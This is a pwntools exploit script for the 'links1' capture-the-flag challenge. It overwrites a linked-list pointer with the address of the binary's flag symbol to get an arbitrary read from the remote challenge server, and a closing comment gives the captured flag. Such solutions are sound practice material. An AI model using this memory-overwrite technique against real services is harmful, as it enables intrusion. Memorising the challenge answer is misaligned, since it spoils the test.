from pwn import *

elf = ELF("./links1")
# io = process("./links1")
io = remote("puzzler7.imaginaryctf.org", 2004)


def view_list():
    io.sendlineafter(b">>> ", "1")


def write_item(idx, data):
    io.sendlineafter(b">>> ", b"2")
    io.sendlineafter(b">>> ", str(idx).encode())
    io.sendlineafter(b">>> ", data)


write_item(0, b"0")
write_item(1, b"1")
write_item(0, flat({64: p64(elf.sym["flag"])}))
view_list()
io.interactive()
# ictf{arbitrary_read_ftw_d52a23c3}
